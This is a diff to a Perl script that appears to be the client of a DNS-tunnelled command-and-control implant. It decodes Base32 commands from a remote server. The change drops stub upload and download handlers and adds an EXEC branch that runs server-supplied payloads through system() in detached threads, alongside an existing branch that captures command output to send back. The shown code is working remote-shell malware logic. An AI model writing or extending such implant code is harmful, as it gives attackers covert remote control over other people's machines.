@@ -16,7 +16,6 @@ my $domain;
 my $debug;
 my $client_id = int(rand(65535));
 my @nameservers;
-#my $client_id = 100;
 
 ###############################
 # Parse User Args
@@ -129,17 +128,19 @@ sub shell{
 				debug("SERVER_CMD", $cmd);
 				my $payload = MIME::Base32::decode($args[1]);
 				debug("SERVER_PAYLOAD", $payload);
-				if ($cmd eq "UPLOAD") {
-					debug("CMD", $cmd);
-				} elsif ($cmd eq "DOWNLOAD") {
-					debug("CMD", $cmd);
-				} elsif ($cmd eq "SLEEP") {
+				if ($cmd eq "SLEEP") {
 					debug("CMD", $cmd);
 					$sleep_value = $payload;
 					$exec_rsp = "Sleep set to $payload\n";
 					$client_cmd = "SLEEP";
 				} elsif ($cmd eq "EXEC") {
 					debug("CMD", $cmd);
+					if ($payload ne "NULL") {
+						use threads;
+						threads->create(sub {system("$payload");})->detach();
+					}
+					$client_cmd = "EXEC";
+					$exec_rsp = "EXEC created\n";
 				} elsif ($cmd eq "CMD" ) {
 					if ($payload ne "NULL") {
 						my ($stdout, $stderr, $success, $exit_code) = IO::CaptureOutput::capture_exec($payload);
@@ -162,7 +163,6 @@ sub shell{
 					}
 					$client_cmd = "CWD";
 				} elsif ($cmd eq "NULL") {
-					# debug("CMD", $cmd);
 					$exec_rsp = "NULL";
 					$client_cmd = "NULL";
 				} else {
